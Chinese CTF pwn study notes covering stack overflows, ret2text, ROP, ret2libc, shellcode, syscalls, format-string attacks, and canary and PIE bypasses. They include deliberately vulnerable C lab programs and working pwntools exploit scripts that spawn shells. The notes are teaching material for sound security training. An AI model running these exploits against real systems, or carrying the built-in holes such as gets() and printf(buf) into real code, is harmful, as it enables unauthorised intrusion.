



# 第一天

## 栈溢出

### 			1.溢出函数

#### 						1) gets

```c
gets(buf);
```

#### 						2) scanf

```c
scanf("%s", buf);
```

#### 						3) read

```c
read(0, buf, 0x100);
```

#### 						4) strcpy

```c
strcpy(buf, input);
```

#### 				5) strcat

```c
    char buf[20] = "Hello, ";
    char buf2[] = "World!";

    strcat(buf, buf2);
```

#### 				6) sprintf

```c
char buf[10];
char str[] = "abc";
sprintf(buf, "Hello: %s", str);
```



### 		2.溢出长度

#### 				1) x86(32位)	

```python
溢出长度 = (ebp - array_addr) + 4
```



#### 				2) x64(64位)

```python
溢出长度 = (rbp - array_addr) + 8
```



## ret2text

​	通过栈溢出控制ret地址，跳转利用程序内已有的后门函数(system("/bin/sh"))

### 1.源码

```c
#include<stdio.h>

void backdoor(){
	system("/bin/sh");
}

void vuln(){
	char buf[10];
	gets(buf);
	printf("%s", buf);	
}

int main(){
	setbuf(stdin, 0);
	setbuf(stdout, 0);
	printf("please input: ");
	vuln();
	return 0;
}
```

编译脚本

```bash
// g32.sh

#!/bin/bash
gcc -m32 -fno-stack-protector -no-pie -z execstack -z norelro $1.c -o $1
```

```bash
// g64.sh

#!/bin/bash
gcc -m64 -fno-stack-protector -no-pie -z execstack $1.c -z norelro -o $164
```

编译命令(filename 不带扩展名)

```bash
./g32.sh filename
./g64.sh filename
```



### 2.利用

#### 				1) x86: 



```python
payload = b'a' * 溢出长度 + p32(target_addr)
```

例：

```c
# ida伪代码
int vuln()
{
  char s[14]; // [esp+6h] [ebp-12h] BYREF

  gets(s);
  return printf("%s", s);
}
```

```
.text:08049196 ; =============== S U B R O U T I N E =======================================
.text:08049196
.text:08049196 ; Attributes: bp-based frame
.text:08049196
.text:08049196                 public backdoor
.text:08049196 backdoor        proc near
.text:08049196
.text:08049196 var_4           = dword ptr -4
.text:08049196
.text:08049196 ; __unwind {
.text:08049196                 push    ebp
.text:08049197                 mov     ebp, esp
.text:08049199                 push    ebx
.text:0804919A                 sub     esp, 4
.text:0804919D                 call    __x86_get_pc_thunk_ax
.text:080491A2                 add     eax, (offset _GLOBAL_OFFSET_TABLE_ - $)
.text:080491A7                 sub     esp, 0Ch
.text:080491AA                 lea     edx, (aBinSh - 804B254h)[eax] ; "/bin/sh"
.text:080491B0                 push    edx             ; command
.text:080491B1                 mov     ebx, eax
.text:080491B3                 call    _system
.text:080491B8                 add     esp, 10h
.text:080491BB                 nop
.text:080491BC                 mov     ebx, [ebp+var_4]
.text:080491BF                 leave
.text:080491C0                 retn
.text:080491C0 ; } // starts at 8049196
.text:080491C0 backdoor
```

```python
payload = b'a' * (0x12 + 4) + p32(0x8049196)
```



#### 				2) x64: 

```python
payload = b'a' * 溢出长度 + p64(target_addr)
```

例：

```c
# ida
int vuln()
{
  char v1[10]; // [rsp+6h] [rbp-Ah] BYREF

  gets(v1);
  return printf("%s", v1);
}
```

```
.text:0000000000400647 ; =============== S U B R O U T I N E =======================================
.text:0000000000400647
.text:0000000000400647 ; Attributes: bp-based frame
.text:0000000000400647
.text:0000000000400647                 public backdoor
.text:0000000000400647 backdoor        proc near
.text:0000000000400647 ; __unwind {
.text:0000000000400647                 push    rbp
.text:0000000000400648                 mov     rbp, rsp
.text:000000000040064B                 lea     rdi, command    ; "/bin/sh"
.text:0000000000400652                 mov     eax, 0
.text:0000000000400657                 call    _system
.text:000000000040065C                 nop
.text:000000000040065D                 pop     rbp
.text:000000000040065E                 retn
.text:000000000040065E ; } // starts at 400647
.text:000000000040065E backdoor        endp
```



**注意： 64位程序ret2text要跳过函数开头的push rbp指令**

```python
payload = b'a' * (0xa + 8) + p64(0x400647 + 1)
```



## rop

### 1.概念

​		ROP（Return-Oriented Programming, 返回导向编程）通俗理解，就是通过栈溢出的漏洞，覆盖return address，从而达让直行程序反复横跳的一种技术。

### 2.寄存器

%rax ：通常存储函数调用的返回结果，也被用在`idiv` （除法）和`imul`（乘法）命令中。

%rsp ：堆栈指针寄存器，指向栈顶位置。pop操作通过增大rsp的值实现出栈，push操作通过减小rsp的值实现入栈。

%rbp ：栈帧指针，标识当前栈帧的起始位置。

![image-20230705212017464](.\SNERT2023\image-20230705212017464.png)

%rdi, %rsi, %rdx, %rcx,%r8, %r9 ：六个寄存器，当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx,  rcx, r8, r9；当参数为7个以上时，前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。



### 		3.条件

system函数(system("xxxx"), 有"/bin/sh"字符串)或者execeve()

```c
#include<stdio.h>

char sh[] = "/bin/sh";

void backdoor(){
	system("hahaha");
}

void vuln(){
	char buf[10];
	gets(buf);
	printf("%s", buf);	
}

int main(){
	setbuf(stdin, 0);
	setbuf(stdout, 0);
	printf("please input: ");
	vuln();
	return 0;
}

```

#### 				1) x86

```python
payload = b'a' * 溢出长度 + p32(system_addr) + p32(sh_addr)
或
payload = b'a' * 溢出长度 + p32(system_addr) + p32(0) + p32(sh_addr)
```



#### 				2) x64

```python
payload = b'a' * 溢出长度 + p64(pop_rdi) + p64(sh_addr) + p64(system_addr)
```



## ret2libc

### 		1. **plt**表和**got**表

#### 				1) plt：

plt是在可执行文件中用于实现动态链接的一种数据结构。它是一张函数跳转表，用于将程序中的函数调用与实际的函数地址进行关联。

在动态链接的情况下，程序在编译时并不知道函数的实际地址，而是通过PLT来间接地进行函数调用。PLT中的每个条目对应一个函数，包含了两个重要的地址：GOT（Global Offset Table）条目和实际的函数入口地址。

当程序需要调用某个函数时，它会首先跳转到对应函数的PLT条目。PLT条目中的GOT条目保存了函数的实际地址。如果GOT条目中存储的是一个特殊的标记，说明该函数还没有被解析，那么PLT会将控制权转交给动态链接器，由动态链接器解析函数地址并更新GOT条目，然后再跳转到函数的实际地址执行。

PLT 中的每个条目都包含两个指令，第一条指令实现了跳转逻辑，用于解析和绑定函数的真实地址，而第二条指令则是跳转到函数的真实地址执行。PLT 中的每个条目的地址实际上指向了 GOT 表中对应的条目。



#### 				2) got：

GOT（Global Offset Table）是一种用于实现动态链接的数据结构。它存储了在程序运行时需要进行动态链接的全局符号（如函数、变量）的真实地址。

GOT 表本身并不包含真实地址，而是包含对真实地址的间接引用。它保存了一系列指向实际地址的指针，这些指针最终被填充为符号的真实地址。在程序加载时，动态链接器（如 ld.so）会根据需要将这些指针解析为实际的地址。

因此，可以说 GOT 表中的内容是真实地址的间接引用，而不是直接的真实地址。真实地址的解析是在运行时进行的，由动态链接器完成。

call _puts = jmp puts@plt jmp puts@got

plt-->got-->libc_addr

libc_base

### 		2.泄露某个函数的真实地址

#### 				1) puts 函数

```python
payload = b'a' * 溢出长度 + p32(puts_plt) + p32(target_addr) + p32(xxx_got) 

libc_base = xxx_real - xxx_offset
system = libc_base + system_offset
binsh = libc_base + str_bin_sh_offset

payload2 = b'a' * 溢出长度 + p32(system) + p32(0) + p32(binsh)
```

```python
payload = b'a' * 溢出长度 + p64(pop_rdi) + p64(xxx_got) + p64(puts_plt) + p64(main)

libc_base = xxx_real - xxx_offset
system = libc_base + system_offset
binsh = libc_base + str_bin_sh_offset

payload2  = b'a' * 溢出长度 + p64(pop_rdi) + p64(binsh) + p64(system)
```



#### 				2) write函数(ret2csu)

```
payload = b'a' * 溢出长度 + p32(write_plt) + p32(main) + p32(1) + p32(xxx_got) + p32(4)

payload2 = b'a' * 溢出长度 + p32(system) + p32(0) + p32(binsh)
```

![image-20230711095213098](.\SNERT2023\image-20230711095213098.png)

```python
payload = b'a' * 溢出长度
payload += p64(add_rsp_8_pop_rbx_rbp_r12_r13_r14_r15)
payload += b'b' * 8 + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)  # 1
payload += p64(mov_rdx_r13_mov_rsi_r14_mov_edi_r15d_add_rbx_1_cmp_rbx_rbp)  # 2  
# 3、4只要满足rbp - 1 = rbx
payload += b'a' * (8 * 7)  # 5
payload += p64(main)

payload2 = b'a' * 溢出长度 + p64(pop_rdi) + p64(binsh) + p64(system)
```





# 第二天

## shellcode

shellcode题的执行shellcode的函数一般无法通过IDA反编译，需要看懂汇编

### 		1.普通shellcode

```c
#include <stdio.h>

void vuln(){
	char shellcode[0x400];
	gets(shellcode);
	((void (*)())shellcode)();
}

int main(){
	setbuf(stdin, 0);
	setbuf(stdout, 0);
	write(1, "what's your name?\n", 18);
	vuln();
	return 0;
}
```



```python
from pwn import *
context.arch = 'i386'  # 64位改为amd64
sc = shellcraft.sh()
print(asm(sc))  # asm要在linux才能用
```



### 		2. alpha shellcode

```c
#include <stdio.h>
#include <string.h>

void vuln(){
	char shellcode[0x400];
	gets(shellcode);
	int i;
    // 检查输入的内容
	for(i = 0; i < strlen(shellcode); i++){
		if (!isalpha(shellcode[i]) && !isdigit(shellcode[i]))
			exit(1);
	}
	((void (*)())shellcode)();
}

int main(){
	setbuf(stdin, 0);
	setbuf(stdout, 0);
	write(1, "what's your name?\n", 18);
	vuln();
	return 0;
}
```

下载alpha项目

```sh
git clone https://github.com/TaQini/alpha3.git
```

把shellcode写入到一个文件里

```python
from pwn import *
context(arch='i386', os='linux')

shellcode = shellcraft.sh()
payload = asm(shellcode)
with open('shellcode_x86', 'wb') as f:  # 模式为wb
    f.write(payload)
```

使用alpha脚本将shellcode编成alpha_shellcode

```bash
python ./ALPHA3.py x64 ascii mixedcase rax --input="shellcode"
或
./shellcode_x86.sh 寄存器
```



## 系统调用

### 	1. syscall 指令 (x64)

#### syscall指令的实现原理  execve('/bin/sh', 0, 0)  调用号：59



rax = 59, rdi = '/bin/sh', rsi = 0, rdx = 0

syscall

操作系统中的系统调用实际上是由操作系统内核提供的功能接口，它们通过一些预定义的协议与用户程序进行通信。在Linux、Unix系列中，系统调用与普通函数调用之间最大的区别就在于执行过程中的特权级别不同。

当用户进程执行syscall指令时，会触发一个特殊的异常，将控制权转交给操作系统内核。内核会通过中断向量表中的系统调用中断处理程序（通常称为 syscall  handler）来处理这个异常，并从中提取出系统调用号和参数等信息，然后执行对应的系统调用服务。最终，它将系统调用返回值传递会用户态，并把用户进程带回执行状态。

 下面是一些比较关键的寄存器和内核接口的介绍：

- %rax 寄存器：存储了系统调用号，在Linux中的系统调用号是通过EAX寄存器传递的。
- %rdi、%rsi、%rdx、%r10、%r8、%r9寄存器：用来传递系统调用的参数。在Linux中，前6个系统调用参数通过寄存器来传递，如上述代码中，第一个参数通过%rdi传递，第二个参数通过%rsi传递，第三个参数通过%rdx传递。
- syscall()：系统调用服务在内核中的实现代码通常是以syscall()的形式存在的，它是一个注重安全、高效、可扩展的通用接口。实际上，在Linux中，所有的系统调用都是通过syscall()来实现的。

```c
#include <stdio.h>
#include <unistd.h>
//#include <string.h>
char sh[] = "/bin//sh";

void sys_call(){
		asm volatile (
	    "syscall \n"
	);
}

void rdx(){
	asm volatile (
	    "mov %0, %%rdx \n"
	    :
	    : "i" (0)
	    : "%rdx"
	);
}

void get() {
	char buf[10];
	gets(buf);
}

void gadget() {
	asm volatile (
	    "mov %0, %%rax \n"
	    :
	    : "i" (0x3b)
	    : "%rax"
	);
}

int main() {
	setbuf(stdin, 0);
	setbuf(stdout, 0);
	get();
	return 0;
}

#!/bin/bash
gcc -m64 -fno-stack-protector -no-pie -z execstack $1.c -o $164
```



```python
from pwn import *


context(arch='i386', os='linux')
context.log_level = 'debug'
url = "192.168.155.143 9000"
host, port = url.replace(' ', ':').split(':')

sh = 0x601038
syscall = 0x4005A7 + 4
ret = 0x40048e
pop_rdi = 0x400693
pop_rsi_r15 = 0x400691
mov_rdx = 0x4005b0
mov_rax = 0x4005DA


p = remote(host, port)

payload = b'a' * (0xa + 8) + p64(mov_rdx) + p64(pop_rsi_r15) + p64(0) * 2 + p64(pop_rdi) + p64(sh) + p64(mov_rax) + p64(syscall)

p.sendline(payload)

p.interactive()

```



### 2. int 0x80 (x86):

**execve(ebx, ecx, edx)  调用号：11**

```
ebx  = '/bin/sh'
ecx = 0
edx = 0
eax = 11
int 0x80
```



```c
#include <stdio.h>
#include <unistd.h>
//#include <string.h>
char sh[] = "/bin//sh";

void sys_call(){
		asm volatile (
	    "syscall \n"
	);
}

void edx(){
	asm volatile (
	    "mov %0, %%edx \n"
	    :
	    : "i" (0)
	    : "%edx"
	);
}

void ecx(){
	asm volatile (
	    "mov %0, %%ecx \n"
	    :
	    : "i" (0)
	    : "%ecx"
	);
}

void get() {
	char buf[10];
	gets(buf);
}

void gadget() {
	asm volatile (
	    "mov %0, %%eax \n"
	    :
	    : "i" (0x3b)
	    : "%eax"
	);
}

int main() {
	setbuf(stdin, 0);
	setbuf(stdout, 0);
	get();
	return 0;
}
```



```python
from pwn import *


context(arch='i386', os='linux')
context.log_level = 'debug'
url = "192.168.155.143 9000"
# host, port = url.replace(' ', ':').split(':')

mov_eax = 0x80484F8
mov_edx = 0x8048495
mov_ecx = 0x80484AA
sh = 0x8049944
int_80h = 0x8048483

p = remote(url)

payload = b'a' * (0x12 - 4) + p32(sh) + b'b' * 4 + p32(mov_ecx) + b'aaaa' + p32(mov_edx) + b'aaaa' + p32(mov_eax) + b'aaaa' + p32(int_80h)

p.sendline(payload)

p.interactive()
```



## 格式化字符串

![image-20230707144129237](.\SNERT2023\image-20230707144129237.png)

##### printf() 执行时的堆栈如图，printf()  维护着一个内部指针，刚开始时该指针指向的是格式化字符串，然后开始将格式化字符串打印到标标输出（STDIO），直到遇到一个特殊字符。如果是 %，  那么 printf() 会期望着后面跟着一个格式控制符，因此将内部指针递增（向帧栈底部方向）以抓取格式 控制符的输入值（一个变量或绝对值）

即使没有提供足够数目的参数，但 printf() 的指针还是会往下移动，抓取下一个值以满足格式化字符串的需要。

printf(buf)

printf("aaaa%p%p", a1, a2)

```c
printf()
%d 输出十进制整数
%f 输出十进制实数
%x 输出16进制数据
%p 输出指针
%s 输出字符串以及打印参数地址处的字符串
%o 输出八进制整数
%c 输出字符
%n 输入到目前为止所写的字符数
    %hhn 写单个字节
    %hn  写2个字节
    %ln  写4字节
    %lln 写8个字节
```



### 		1.泄露内存

```
%n$p
或
%n$x
```



### 		2.修改内存

```python
'%xc' + addr + '%q$n(hhn 或 hn、ln、lln)'
# q为addr所在的偏移，x为要把addr修改为的值

# 例，如果输入的第一个参数偏移为8，要将0x08060402处的值修改为20
b'%20c' + p32(0x08060402) + b'%9$hhn'
由于偏移是8， 所以 '%20c' 占了第8个参数，addr占的是第9个，所以是'%9$hhn'

或 b'%20c' + b'%11$hhn' + b'a' + p32(0x08060402)
地址在后，偏移增加。注意：要对应边界，此处在addr前的字符长度不是4的倍数，用a填充
'%20c' 占了第8个参数，'%11$'占的是第9个， 'hhna'占第10，所以11是addr
```



# 第三天

## canary绕过

**特点**

**Canary** 所生成的随机数有一个非常重要的特点：随机数的第一个字节必然是 **0x00** 。如此设计的主要目的是实现字符串截断，以避免随机数被泄露。

### 		1.逐位爆破

#### 1.1 方法简介

一般来说，要想知道一个 **64位** 的随机数是多少，我们需要尝试 2^64 次。但是在爆破 **canary** 的场景下，若其长度为 **64位** ，我们也只需要尝试 **256 * 7** 次就能猜到目标随机数。0x00- 0xff  2 ^ (8 * 8)

这是什么原因呢？其实 **逐字节爆破** 这个名称本身已经说明了一部分问题：我们的爆破是以字节为单位的，每个字节共需要尝试 **256** 次，总共需要尝试 **7** 个字节（因为首字节必然是 **0x00** ，这是 **Canary** 本身的特点）。

那为什么在爆破 **canary** 时，我们可以逐字节爆破呢？爆破 **canary** 和爆破其他随机数的区别是什么呢？答案其实很简单，因为当我们在爆破某一字节的时候，我们可以很轻易地知道当前字节是否正确。举个例子，假定某程序生成的 **canary** 为： **0x0011223344556677** ，我们想通过爆破的方法知道第 **5** 个字节的值是多少，我们将经历以下过程：

![img](.\SNERT2023\v2-90805acc33a2afa88a1e733f6abc8d99_720w.webp)

可以看到，图中的方格有三种颜色，其含义分别是：

1. 青色方块：在之前的爆破中已经确定下来的字节。
2. 黑色方块：正在爆破的字节。
3. 橙色方块：还未爆破的字节。

其中，青色方块和黑色方块由我们人为覆盖；橙色方块是内存中的原始数据。由于青色方块是之前的爆破中已经确定下来的，橙色方块是内存中的原始数据，因此青色方块和橙色方块中的字节都是完全正确的（尽管我们不知道橙色方块中的字节具体是多少，但它绝对是正确的）。因此，在尝试的过程中，只有黑色方块中的字节是不确定的，而确定一个字节只需要尝试最多 **256** 次。

当剩余的 **7** 字节全部被爆破出来后， **canary** 也就被爆破出来了。

#### 				1.2 fork 函数

##### 适用条件

由于随机数是在程序启动时随机生成的，这就意味着在一般的场景下，是无法通过这一方法获取随机数的（因为一旦尝试失败，程序便会崩溃，而重新启动程序又会重新生成一个随机数）。

但在某些特定的场景下，我们是可以通过逐字节爆破的方法获取随机数的。例如，若程序调用 **fork()** 函数创建了 **足够多** 的子进程。这种场景具有以下两个特点：

1. 由于子进程和父进程的栈结构是完全相同的，因此保存在子进程栈上的随机数与保存在父进程栈上的随机数完全相同。换句话说，所有子进程和父进程共享同一个 **canary** 。
2. 子进程的崩溃不会导致父进程崩溃。

这两个特点意味着我们可以不断访问子进程，直到找到一个不会使子进程崩溃的随机数。这个随机数也就是真正的 **canary** 。

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/wait.h>
#include<string.h>
char s[10];


void getshell() {
	printf("Do_you_want_bin_sh?\n");
	printf("There_is_no_bin_sh_here");
}


void getflag(a) {
	system(a);

}

void init() {
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);
	setbuf(stderr, NULL);
	strcpy(s,"/bin/sh");
}

void overflow(void) {
	char buffer[100];
	read(STDIN_FILENO, buffer, 130);
}


int main(void) {
	char buf[100];
	init();
	int n = 0;
	pid_t pid;
	for(; n<=336; n++) {
		pid = fork();

		if(pid < 0) {
			puts("fork error");
			exit(0);
		}

		else if(pid == 0) {
			puts("fork?");
			overflow();
			puts("sucess");
			break;
		} else {
			wait(0);
		}
	}
	printf("Failure!");
	return 0;
}
// gcc -m32 -Wno-stack-protector -no-pie -fno-pie -z execstack $1.c -o $1
```

```python
from pwn import *

# context.log_level = 'debug'
context(os='linux', arch='i386')

io = process('./fork')

io.recvuntil(b'fork?\n')
canary = b'\x00'
for j in range(3):
    for i in range(0x100):
        print(j, i, sep=' ')
        io.send(b'a'*100 + canary + p8(i))  # chr(i).encode()
        a = io.recvuntil(b'fork?\n')
        if b'sucess' in a:
            # print('aaaa')
            canary += p8(i)  # chr(i).encode()
            print(i, canary)
            break
        print(canary)
        if i == 255:
            exit()
print(canary)
payload = b'a'*100
payload += canary
payload += b'a'*12
payload += p32(0x804924e) + p32(0x804B350) + p32(0x804b350)

io.sendline(payload)
io.interactive()
# socat tcp-listen:10002,reuseaddr,fork EXEC:./fork2.fork,pty,raw,echo=0
```

**练习 ： SWCTF pwn 花活**



### 		2.printf 函数泄露

#### 				1) 覆盖"\0"泄露

题目特征：

```c
printf("%s", buf);
```

因为首字节必然是  **0x00**，并且printf("%s", buf) 遇 **'\0'**   \x00 才停止输出的特点，只要把canary首位的 **'\x00'** 覆盖成其他内容，就可以输出处于 **buf** 参数后的内存数据

![image-20230707233748050](.\SNERT2023\image-20230707233748050.png)

输出：

```
a * 10
```



![image-20230707234241955](.\SNERT2023\image-20230707234241955.png)

输出：

```python
a * 10 + '\n' + '\x11\x22\x33\x44\x55\x66\x77'
```

```c
// printf0.c
#include <stdio.h>


void aaa(){
	system("/bin/sh");
}

void bbb(){
	char buf[10];
	read(0, buf, 0x20);
	printf("%s", buf);
	gets(buf);
}

int main(){
	setbuf(stdin, 0);
	setbuf(stdout, 0);
	bbb();
	
}
// gcc -m32 -Wno-stack-protector -no-pie -fno-pie -z execstack $1.c -o $1
```

```python
from pwn import *


context.log_level = 'debug'
context(arch='i386', os='linux')

p = process('printf0')
gdb.attach(p)
# p.recvuntil(b'name?\n')

payload = b'a' * 10
pause()
p.sendline(payload)
p.recv(11)

canary = u32(p.recv(3).rjust(4, b'\x00'))
print(hex(canary))

payload = b'a' * 10 + p32(canary) + b'a' * (8 + 4) + p32(0x8048586)

p.sendline(payload)

p.interactive()
```

**练习：buuctf [第十五章] [15.5.2 canary bypass]ex2** 



#### 				2) 格式化字符串泄露

```
'%offset$p'
```

先输入

```
aaaa.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
```

找出格式化字符串的偏移，然后计算canary在栈上与格式化字符串buf的距离

```python
canary_offset = buf_offset + (canary_addr - buf_addr) // 8 (4)
```

题目特征：

```c
read(0, buf, 0xnn);
printf(buf);
```

```c
// printffmt.c
#include <stdio.h>


void aaa(){
	system("/bin/sh");
}

void bbb(){
	char buf[10];
	read(0, buf, 0x100);
	printf(buf);
	gets(buf);
}

int main(){
	setbuf(stdin, 0);
	setbuf(stdout, 0);
	bbb();
	
}

//gcc -m32 -Wno-stack-protector -no-pie -fno-pie -z execstack $1.c -o $1
```

```python
from pwn import *


context.log_level = 'debug'
context(arch='i386', os='linux')

canary = 0
for i in range(20):
    p = process('printffmt')
    # gdb.attach(p)
    payload = '%{}$p'.format(i).encode()
    # pause()
    p.sendline(payload)
    tmp = p.recvline()
    if b'00' in tmp:
        print(tmp)
        inp = int(input(':'))
        if inp:
            canary = int(tmp.decode()[2:-1], 16)
            break
        p.close()

print("canary: ", hex(canary))
payload = b'a' * 10 + p32(canary) + b'a' * (8 + 4) + p32(0x8048586)
p.sendline(payload)

p.interactive()
```

**练习 ctfshow pwn 吃鸡杯 easy_canary**













## pie绕过

### 1. fork爆破（partial write）

​	partial  write(部分写入)就是一种利用了PIE技术缺陷的bypass技术。由于内存的页载入机制，PIE的随机化只能影响到单个内存页。通常来说，一个内存页大小为**0x1000**，这就意味着不管地址怎么变，某条指令的**后12位，3个十六进制数**的地址**（0x000-0xfff）**是始终不变的。因此通过覆盖**EIP(返回地址)**的后8或16位 (按字节写入，每字节8位)就可以快速爆破或者直接劫持EIP。

![image-20230708123125812](.\SNERT2023\image-20230708123125812.png)

![image-20230708123203516](.\SNERT2023\image-20230708123203516.png)

```c
// pie.c

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/wait.h>
#include<string.h>
char s[10];

void getflag() {
	system(s);
}

void init() {
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);
	setbuf(stderr, NULL);
	strcpy(s,"/bin/sh");
}

void overflow(void) {
	char buffer[100];
	read(STDIN_FILENO, buffer, 130);
}


int main(void) {
	char buf[100];
	init();
	int n = 0;
	pid_t pid;
	while(1) {
		pid = fork();

		if(pid < 0) {
			puts("fork error");
			exit(0);
		}

		else if(pid == 0) {
			puts("fork?");
			overflow();
			puts("sucess");
			break;
		} else {
			wait(0);
		}
	}
	printf("Failure!");
	return 0;

}
// gcc -m32 -fno-stack-protector -z execstack $1.c -o $1

```

```python
from pwn import *

context.log_level = 'debug'
context(os='linux', arch='i386')

p = process('pie')
p.recvuntil(b'fork?\n')

for i in range(16):
    payload = b'a' * (0x6c + 4) + b'\x09' + p8(7 + 16 * i)
    p.send(payload)
    tmp = p.recvuntil(b'fork?\n', timeout=1)
    print(tmp)
    if tmp == b'':
        p.sendline(b'ls')
        p.interactive()


```



### 2. **覆盖\x00 printf泄露**

​	攻击思路与canary一样

​	**注意：**若开启了canary要先泄露canary再泄露 **ret** 

```python
payload = b'a' * buf_length + '\n'  # canary

payload = b'a' * 溢出长度 + b'\xnn' + b'\xsn'  # n为已知的最后3位16进制地址，s为要爆破的地址0-0xf

```

```
payload = b'a' * 溢出长度
p.send()
```



### 3. 格式化字符串泄露

#### 泄露 ret 地址，ret2text 

(pwndbg 调试找到main的格式化偏移，然后泄露地址)

```
aaaa + '.%p' * n
```

​	参考canary计算偏移**`(buf_offset + (ret_addr - buf_addr) // 8 (4))`**

```
// 栈偏移
-006c buf
-0068 
...
+0000 ebp
+0004 ret
```

```
					(ret - (buf)) //4
offset = buf_offset + (4-(-0x6c)) // 4

%offset$p
```



#### 泄露got

```python
ret = 0xnnnnn321

elf_base = 0xnnnnn000

got = elf_base + 某函数got地址的偏移

# 泄露函数的真实地址
payload = '%offset$s' + p32(got)

# 网站找对应libc版本
# 算出system和/bin/sh的真实地址
# 构造ROP，执行system('/bin/sh')
```





